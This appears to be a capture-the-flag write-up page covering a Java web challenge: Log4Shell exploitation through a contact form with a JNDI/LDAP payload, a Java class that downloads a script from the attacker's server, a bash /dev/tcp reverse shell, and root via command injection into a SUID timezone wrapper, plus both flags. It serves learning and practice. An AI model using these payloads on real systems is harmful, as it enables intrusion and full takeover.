@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF writeups</title>
+    <link rel="stylesheet" href="/css/styles.css">
+    <link rel="stylesheet" href="/css/posts.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+</head>
+<body>
+    <!-- Header will be loaded here -->
+    <div id="header-placeholder"></div>
+    <div class="main-content">
+        <div class="container">
+<h4 id="challenge-details">Challenge details</h4>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Category</strong></td>
+<td>Web</td>
+</tr>
+<tr>
+<td><strong>Challenge Type</strong></td>
+<td>Track (2 challenges)</td>
+</tr>
+<tr>
+<td><strong>Points</strong></td>
+<td>4-3</td>
+</tr>
+<tr>
+<td><strong>Author</strong></td>
+<td><code>Seneque</code></td>
+</tr>
+<tr>
+<td><strong>Original Solver</strong></td>
+<td><code>labubu sauce graine</code> (willi34)</td>
+</tr>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>3/10 - 1/10</td>
+</tr>
+</tbody>
+</table>
+<h4 id="overview">Overview</h4>
+<p>The challenge features a black-box type environment with no source-code, similar to HTB boxes. The application is built in Java and is mostly static. It seems to be a shop of some sorts : 
+<img alt="Web app pic" src="/images/unitedctf2025/suisse1.png" /></p>
+<p>The most interesting place where the application processes user input is the contact page : 
+<img alt="Web app pic" src="/images/unitedctf2025/suisse2.png" /></p>
+<p>We can test basic web vulnerabilities and XSS payloads on the contact page, but nothing comes up.</p>
+<h4 id="initial-foothold">Initial Foothold</h4>
+<p>The author left a hint in the challenge description. It stated that the application was last updated in 2021. Knowing the application is running Spring Boot (sending a dummy request to a non-existing page returns a <strong>WhiteLabel</strong> error page specific to Spring), the hint is probably referring to <code>Log4Shell</code>. In late 2021, the <strong>Logging for Java</strong> library was discovered to be vulnerable to remote code execution exploit with a severity level of 10. For those unaware of this vulnerability, searching for <em>Spring Boot 2021 exploit</em> would lead to the same conclusion.</p>
+<p><code>Log4Shell</code> worked by inserting a malicious string in the application that would trigger a remote lookup process when logged by the library. One of these lookups is called a <strong>JNDI</strong> (Java Naming and Interface Directory) lookup, and it's used to allow applications to remotely fetch and use Java objects. The danger with this type of lookup is that an attacker can host a malicious class remotely and make the application run arbitrary code just by logging his request.</p>
+<p>JNDI lookup's are often made over the LDAP protocol. LDAP will provide the application with the information about the object's whereabouts and how to access it. The syntax for the lookup looks like this :</p>
+<pre class="codehilite"><code>${jndi:ldap://&lt;IP&gt;:&lt;PORT&gt;/&lt;FILE&gt;}
+</code></pre>
+
+<p>So how can we make the application parse a request containing this lookup string? In a lot of cases, sending normal web requests could work. We could place this string in an HTTP header like <strong>User-Agent</strong> and hope it would be logged somewhere by the library. In our case, we get an even juicier target on the contact page through the message. </p>
+<p>To confirm this vulnerability, we'll setup <a href="">ngrok</a> to expose a local port listening with netcat and point our JNDI looup string to the exposed port :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 389  
+listening on [any] 389 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 51330
+0
+</code></pre>
+
+<p>Nice, this means we were able to send a crafted log entry to the application that triggered a lookup request for a Java class from a source we control. To fully exploit this vulnerability, we'll need to setup an actual LDAP server that will be able to host and deliver our malicious class to the application. We'll mostly follow the steps documented in <a href="https://infosecwriteups.com/exploiting-log4shell-how-log4j-applications-were-hacked-906fe13aeded">this</a> blog post.</p>
+<p>For the exploit, I used a AWS EC2 free tier machine (t2.micro), since I didn't really feel like installing all the different components and a different version of Java on my virtual machine. This also make things easier to setup instead if having to track what request goes where through <code>ngrok</code>. The only thing to watch out for is that we have to allow TCP traffic in through security profiles (<code>Security Groups -&gt; Click on the group assigned on creation -&gt; Edit inbound rule -&gt; Add rule -&gt; All TCP 0.0.0.0/0</code>) in order to receive the JNDI lookups from the target.</p>
+<p>We'll need to install a few things on the instance before proceeding :</p>
+<ul>
+<li><code>git</code> : To fetch the repos we need for the exploit</li>
+<li><code>temurin-8-jdk</code> : Distribution of Java version 8 (the tool we'll use for the LDAP server only works in this version)</li>
+<li><code>maven</code> : Dependency tool for Java projects</li>
+</ul>
+<p>To install the Temurin distribution of Java, we need to add the maintainer's signing key to our keyring and add the repository inside of <code>apt</code>'s configuration. Here is the list of commands to run to install all the packages necessary :</p>
+<pre class="codehilite"><code>sudo apt install wget gnupg apt-transport-https -y
+
+wget -O - https://packages.adoptium.net/artifactory/api/gpg/key/public | sudo gpg --dearmor -o /usr/share/keyrings/adoptium-keyring.gpg
+
+echo &quot;deb [signed-by=/usr/share/keyrings/adoptium-keyring.gpg] https://packages.adoptium.net/artifactory/deb $(awk -F= '/^VERSION_CODENAME/{print $2}' /etc/os-release) main&quot;   | sudo tee /etc/apt/sources.list.d/adoptium.list
+
+sudo apt update
+
+sudo apt install temurin-8-jdk
+
+sudo apt install git
+
+sudo apt install maven
+</code></pre>
+
+<p>Once the new Java version is installed, we can test the executable to make sure everything works :</p>
+<pre class="codehilite"><code>/usr/lib/jvm/temurin-8-jdk-amd64/bin/java -version
+</code></pre>
+
+<p>For our LDAP server, we'll use <code>Marshalsec</code>, a security research tool made to aid in deserialization attacks :</p>
+<pre class="codehilite"><code>git clone https://github.com/mbechler/marshalsec
+
+cd marshalsec/
+
+mvn package -DskipTests
+</code></pre>
+
+<pre class="codehilite"><code>admin@ip-172-31-16-223:~/marshalsec$ ls
+LICENSE.txt  README.md  marshalsec.pdf  pom.xml  src  target
+</code></pre>
+
+<p>For the malicious class, we can use the <code>Runtime</code> object to execute system commands. I tried for a long time to get direct reverse shells working, but nothing would work. In the end, I had to host the payload inside a file, fetch it with the first JDNI lookup and then execute it with a second lookup.</p>
+<p>First, we can write the reverse shell payload inside a bash script :</p>
+<pre class="codehilite"><code>admin@ip-172-31-16-223:~$ cat pwn.sh 
+#!/bin/bash
+
+bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1
+</code></pre>
+
+<p>Then, we'll create our <code>Exploit.java</code> file with the first command that fetches the reverse shell :</p>
+<pre class="codehilite"><code class="language-java">public class Exploit {
+    static {
+        try {
+        Runtime.getRuntime().exec(&quot;curl -o /dev/shm/pwn.sh http://&lt;PUBLIC-IP&gt;:8000/pwn.sh&quot;);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+</code></pre>
+
+<p>We'll compile the Java code into a usable class using our Java binary :</p>
+<pre class="codehilite"><code>/usr/lib/jvm/temurin-8-jdk-amd64/bin/javac Exploit.java
+</code></pre>
+
+<p>Start our LDAP server with the same binary :</p>
+<pre class="codehilite"><code>/usr/lib/jvm/temurin-8-jdk-amd64/bin/java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://&lt;PUBLIC-IP&gt;:8000/#Exploit&quot;
+</code></pre>
+
+<p>We can open another SSH session on the instance and start a python web server inside the same directory as our <code>pwn.sh</code> and <code>Exploit.class</code> files. The Java class will be fetched from the LDAP reference, while the bash script will be fetched during the executed command :</p>
+<pre class="codehilite"><code>admin@ip-172-31-16-223:~$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre>
+
+<p>To trigger the exploit, we can send this message through the contact form :</p>
+<pre class="codehilite"><code>${jndi:ldap://&lt;EC2-IP&gt;:1389/Exploit}
+</code></pre>
+
+<p>We should first see the requests hit our LDAP server :</p>
+<pre class="codehilite"><code>admin@ip-172-31-16-223:~/marshalsec$ /usr/lib/jvm/temurin-8-jdk-amd64/bin/java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://3.144.211.19:8000/#Exploit&quot;
+Listening on 0.0.0.0:1389
+Send LDAP reference result for Exploit redirecting to http://3.144.211.19:8000/Exploit.class
+Send LDAP reference result for Exploit redirecting to http://3.144.211.19:8000/Exploit.class
+Send LDAP reference result for Exploit redirecting to http://3.144.211.19:8000/Exploit.class
+</code></pre>
+
+<p>We should also see the requests for both files on our python web server :</p>
+<pre class="codehilite"><code>admin@ip-172-31-16-223:~$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+5.161.253.43 - - [28/Sep/2025 18:02:18] &quot;GET /Exploit.class HTTP/1.1&quot; 200 -
+5.161.253.43 - - [28/Sep/2025 18:02:18] &quot;GET /pwn.sh HTTP/1.1&quot; 200 -
+5.161.253.43 - - [28/Sep/2025 18:02:18] &quot;GET /Exploit.class HTTP/1.1&quot; 200 -
+5.161.253.43 - - [28/Sep/2025 18:02:18] &quot;GET /pwn.sh HTTP/1.1&quot; 200 -
+5.161.253.43 - - [28/Sep/2025 18:02:18] &quot;GET /Exploit.class HTTP/1.1&quot; 200 -
+5.161.253.43 - - [28/Sep/2025 18:02:18] &quot;GET /pwn.sh HTTP/1.1&quot; 200 -
+</code></pre>
+
+<p>Now that our reverse shell is on the system, we can make a second Java class that will simply execute the uploaded file :</p>
+<pre class="codehilite"><code class="language-java">public class Exploit {
+    static {
+        try {
+        Runtime.getRuntime().exec(&quot;bash /dev/shm/pwn.sh&quot;);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+</code></pre>
+
+<p>Trigger the exploit again, and we receive a shell :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 1234 
+listening on [any] 1234 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 54550
+bash: cannot set terminal process group (20): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@2f59a12a5aa9:/opt/horloger/web$ whoami
+whoami
+www-data
+www-data@2f59a12a5aa9:/opt/horloger/web$ 
+</code></pre>
+
+<p>The first flag is inside the current directory :</p>
+<pre class="codehilite"><code>www-data@2f59a12a5aa9:/opt/horloger/web$ ls
+ls
+target
+user.txt
+
+www-data@2f59a12a5aa9:/opt/horloger/web$ cat user.txt
+cat user.txt
+flag-l0g4j_t1m3_1s_pr3c10us_sw1ss_h0rl0g3r
+</code></pre>
+
+<h4 id="privilege-escalation">Privilege Escalation</h4>
+<p>Now as a low privileged user on the system, we can look for ways to elevation our access to root. The author left a hint about time in a text file one directory back :</p>
+<pre class="codehilite"><code>www-data@2f59a12a5aa9:/opt/horloger/web$ cd ..
+cd ..
+
+www-data@2f59a12a5aa9:/opt/horloger$ ls
+ls
+system_notes.txt
+web
+
+www-data@2f59a12a5aa9:/opt/horloger$ cat system_notes.txt
+cat system_notes.txt
+# Swiss Horloger System Administration Notes
+# Time management is critical for precise Swiss clockwork
+</code></pre>
+
+<p>After a bit of digging, we find a scratched cronjob that runs the <code>/usr/local/bin/timedatectl</code> command as the root user every 5 minutes  :</p>
+<pre class="codehilite"><code>www-data@2f59a12a5aa9:/opt/horloger$ cd /etc/cron.d
+
+www-data@2f59a12a5aa9:/etc/cron.d$ ls
+e2scrub_all
+horloger
+
+www-data@2f59a12a5aa9:/etc/cron.d$ cat horloger
+# Swiss Horloger Maintenance Tasks
+# */5 * * * * root /usr/local/bin/timedatectl status &gt; /var/log/horloger/time_check.log
+# Precision timing maintenance - Swiss quality guaranteed
+</code></pre>
+
+<p>This executable happens to be running as an <code>SUID</code> binary, which means it gets executed with the permissions of the owner (root in this case) :</p>
+<pre class="codehilite"><code>www-data@2f59a12a5aa9:/etc/cron.d$ ls -la /usr/local/bin/timedatectl
+-rwsr-xr-x 1 root root 17176 Sep 19 07:48 /usr/local/bin/timedatectl
+</code></pre>
+
+<p>Another way to find this potential misconfiguration is to list all the files with the <code>SUID</code> bit set. Files like these are made this way to allow users to perform a specific action as root without giving them full rights to act on behalf of root :</p>
+<pre class="codehilite"><code>www-data@2f59a12a5aa9:/opt/horloger$ find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \;
+find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \;
+-rwsr-xr-x 1 root root 35040 Jan 20  2022 /bin/umount
+-rwsr-xr-x 1 root root 55528 Jan 20  2022 /bin/mount
+-rwsr-xr-x 1 root root 71912 Jan 20  2022 /bin/su
+-rwsr-xr-x 1 root root 58416 Feb  7  2020 /usr/bin/chfn
+-rwsr-xr-x 1 root root 63960 Feb  7  2020 /usr/bin/passwd
+-rwsr-xr-x 1 root root 44632 Feb  7  2020 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 52880 Feb  7  2020 /usr/bin/chsh
+-rwsr-xr-x 1 root root 88304 Feb  7  2020 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 182600 Jun 26 17:03 /usr/bin/sudo
+-rwsr-xr-x 1 root root 17176 Sep 19 07:48 /usr/local/bin/timedatectl
+</code></pre>
+
+<p>We can find many normal executables with this bit set on Linux systems. The problem arises when commands or scripts with this bit set contain vulnerabilities or features that allows a user to maintain his elevated access after execution. For example, allowing a user to use a file-editor as root can result in him being able to launch commands from the program, which are consequently ran as root.</p>
+<p>Let's investigate the binary. First off, it seems to be a wrapper (an interface that uses the original command under the hood and adds functionality) for the actual <code>timedatectl</code> command :</p>
+<pre class="codehilite"><code>www-data@2f59a12a5aa9:/opt/horloger$ /usr/local/bin/timedatectl
+=================================
+  Swiss Precision Time Control   
+  Horloger Suisse TimeDateCtl    
+=================================
+
+No command specified.
+
+Usage: timedatectl [COMMAND]
+
+Commands:
+  status              Show current time/date settings
+  show-timesync       Show time synchronization settings
+  set-timezone ZONE   Set system timezone
+  help                Show this help message
+
+Swiss precision guaranteed!
+</code></pre>
+
+<p>This is what a normal execution of <code>timedatectl</code> looks like :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~]
+└─$ timedatectl
+               Local time: Sun 2025-09-28 14:10:04 EDT
+           Universal time: Sun 2025-09-28 18:10:04 UTC
+                 RTC time: Sun 2025-09-28 18:10:04
+                Time zone: America/New_York (EDT, -0400)
+System clock synchronized: yes
+              NTP service: active
+          RTC in local TZ: no 
+</code></pre>
+
+<p>The <code>status</code> option just displays the first half of the original command output :</p>
+<pre class="codehilite"><code>www-data@2f59a12a5aa9:/opt/horloger$ /usr/local/bin/timedatectl status
+=================================
+  Swiss Precision Time Control   
+  Horloger Suisse TimeDateCtl    
+=================================
+
+Local time: Sun Sep 28 18:11:34 UTC 2025
+Universal time: Sun Sep 28 18:11:34 UTC 2025
+Time zone: Etc/UTC
+</code></pre>
+
+<p>The <code>show-timesync</code> displays the second half :</p>
+<pre class="codehilite"><code>www-data@2f59a12a5aa9:/opt/horloger$ timedatectl show-timesync
+timedatectl show-timesync
+=================================
+  Swiss Precision Time Control   
+  Horloger Suisse TimeDateCtl    
+=================================
+
+Time synchronization status:
+NTP service: inactive
+System clock synchronized: Unknown
+</code></pre>
+
+<p>The last option, <code>set-timezone</code>, takes an argument to use inside another command executed by the binary :</p>
+<pre class="codehilite"><code>www-data@2f59a12a5aa9:/opt/horloger$ timedatectl set-timezone 'test'
+=================================
+  Swiss Precision Time Control   
+  Horloger Suisse TimeDateCtl    
+=================================
+
+[Swiss Horloger] Setting timezone to: test
+[Swiss Horloger] Executing: ln -sf /usr/share/zoneinfo/test /etc/localtime
+[Swiss Horloger] Timezone updated with Swiss precision!
+www-data@2f59a12a5aa9:/opt/horloger$ 
+</code></pre>
+
+<p>This is a classic command injection scenario. Since the original <code>timedatectl</code> command is ran as root, whatever command we are able to inject will also run as root. In the spirit of SUID binaries, we'll set the SUID bit on <code>/bin/bash</code> :</p>
+<pre class="codehilite"><code>www-data@2f59a12a5aa9:/opt/horloger$ timedatectl set-timezone 'test; chmod u+s /bin/bash' 
+chmod: cannot operate on dangling symlink '/etc/localtime'
+=================================
+  Swiss Precision Time Control   
+  Horloger Suisse TimeDateCtl    
+=================================
+
+[Swiss Horloger] Setting timezone to: test; chmod u+s /bin/bash
+[Swiss Horloger] Executing: ln -sf /usr/share/zoneinfo/test; chmod u+s /bin/bash /etc/localtime
+[Swiss Horloger] Timezone updated with Swiss precision!
+</code></pre>
+
+<p>This now means that any user on the system can execute the <code>bash</code> shell as root :</p>
+<pre class="codehilite"><code>www-data@2f59a12a5aa9:/opt/horloger$ ls -la /bin/bash
+-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
+
+www-data@2f59a12a5aa9:/opt/horloger$ /bin/bash -p
+
+whoami
+root
+</code></pre>
+
+<p><em>Note : The <code>-p</code> option is used to preserve permissions on execution, otherwise the shell drops them</em></p>
+<p>The second flag is inside the root user's home directory, <code>/root</code> :</p>
+<pre class="codehilite"><code>cd /root
+
+ls -la
+total 32
+drwx------ 1 root root 4096 Sep 19 07:48 .
+drwxr-xr-x 1 root root 4096 Sep 28 17:23 ..
+-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
+drwxr-xr-x 1 root root 4096 Sep 28 17:23 .m2
+-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
+-rw-r--r-- 1 root root  165 Aug  2  2022 .wget-hsts
+-rw------- 1 root root   54 Sep 19 07:48 root.txt
+
+cat root.txt
+flag-t1m3_1s_r00t_sw1ss_m4st3r_h0rl0g3r_rul3s_th3_t1m3
+</code></pre>
+    <!-- Footer will be loaded here -->
+        </div>
+    </div>
+    <div id="footer-placeholder"></div>
+    <script src="/js/script.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-json.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-java.min.js"></script>
+</body>
+</html>
